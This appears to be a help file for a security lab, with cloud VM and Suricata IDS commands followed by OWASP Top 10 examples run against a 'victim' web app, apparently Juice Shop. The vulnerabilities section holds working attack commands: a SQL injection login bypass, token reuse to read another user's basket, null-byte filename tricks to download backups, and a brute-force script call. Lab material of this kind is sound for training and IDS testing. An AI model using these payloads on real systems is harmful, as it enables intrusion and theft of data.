# Help

## Yandex Cloud

### Create VM
```bash
yc compute instance create \
  --name warfare-vm \
  --public-ip \
  --zone ru-central1-a \
  --hostname warfare-vm \
  --cores 2 \
  --memory 2GB \
  --create-boot-disk image-id=fd84n8eontaojc77hp0u,size=40GB,image-folder-id=standard-images \
  --ssh-key ~/.ssh/id_rsa.pub \
  --core-fraction 50
```

## General

### Resize vagrant disk
```bash
df -h
lsblk
sudo pvresize /dev/sda3
sudo lvextend -l +100%FREE /dev/mapper/ubuntu--vg-ubuntu--lv
sudo resize2fs /dev/mapper/ubuntu--vg-ubuntu--lv
sudo cfdisk /dev/sda
```

### Check iptables:
```bash
sudo iptables -L DOCKER-USER -nv --line-numbers
```

### Check Suricata logs:
```bash
journalctl -u suricata.service -b
sudo tail -n 200 /var/log/suricata/suricata.log
sudo tail -n 0 -f /var/log/suricata/fast.log
sudo tail -n 0 -f /var/log/suricata/eve.json | jq .
```

### Run Suricata:
```bash
sudo suricata -c /etc/suricata/suricata.yaml -q 0
```

## Vulnerabilities

### A01:2021 Broken Access Control

```bash
curl -s -X POST victim:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}" | jq -r '.authentication.token'

export TOKEN=...

curl -X GET victim:3000/rest/basket/1 \
     -H "Authorization: Bearer $TOKEN" | jq
```

### A02:2021 Cryptographic Failures

```bash
curl -X GET victim:3000/ftp/package.json.bak # won't work
curl -X GET "victim:3000/ftp/package.json.bak%2500.md" \
     -o package.json.bak
curl -X GET "victim:3000/ftp/package.json.bak%2500.pdf" \
     -o package.json.bak
```

### A03:2021 Injection

```bash
curl -X POST victim:3000/rest/user/login \
     -H "Content-Type: application/json" \
     -d "{\"email\":\"' OR 1=1 --\",\"password\":\"any\"}"
```

### A04:2021 Insecure Design

```bash
cd /opt
source venv/bin/activate
python3 brute_login.py
```

### A05:2021 Security Misconfiguration

```bash
curl victim:3000/ftp/legal.md%2500.md
curl victim:3000/ftp/
curl victim:3000/metrics
curl victim:3000/api/SecurityQuestions | jq
curl victim:3000/score-board
```

### A06:2021 Vulnerable Components

```bash
curl victim:3000/ftp/nonexistent.txt
```
